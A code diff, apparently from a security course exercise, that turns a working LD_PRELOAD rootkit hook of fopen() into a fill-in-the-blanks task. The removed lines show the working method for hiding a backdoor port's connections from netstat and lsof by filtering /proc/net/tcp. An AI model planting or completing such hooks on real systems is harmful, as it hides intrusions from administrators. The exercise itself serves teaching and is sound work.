@@ -259,9 +259,12 @@ FILE *fopen64(const char *pathname, const char *mode)
 
 
 
+/**
+* TODO: complete fopen() by replacing all TODO
+*
 
 /**
-*
+* 
 * Hooking fopen() to hide backdoor connection from netstat (and lsof)
 *
 * netstat reads tcp connection input from /proc/net/tcp
@@ -276,9 +279,9 @@ FILE *fopen64(const char *pathname, const char *mode)
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
 {
-	orig_fopen = dlsym(RTLD_NEXT, "fopen");
+	orig_fopen = dlsym(RTLD_NEXT, "TODO");      //Hint: what is the name of the function we are hooking?
 
-	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
+	char *ptr_tcp = strstr(pathname, "TODO");   //Hint: what is the path for tcp connection inputs?
 
 	FILE *fp;
 
@@ -289,15 +292,14 @@ FILE *fopen(const char *pathname, const char *mode)
 		fp = orig_fopen(pathname, mode);
 		while (fgets(line, sizeof(line), fp))
 		{
-			char *listener = strstr(line, KEY_PORT); 
-			if (listener != NULL)
+			char *listener = strstr(line, TODO); //Hint: what port goes here?
+			if (listener == NULL)
 			{
-				continue;
+				fputs(TODO, TODO); //Hint: we want to still show all other connections
 			}
-			else
-			{
-				fputs(line, temp);
-			}
+            
+            //Otherwise, fopen ignores this connection (Nothing to do here)
+
 		}
 		return temp;
 
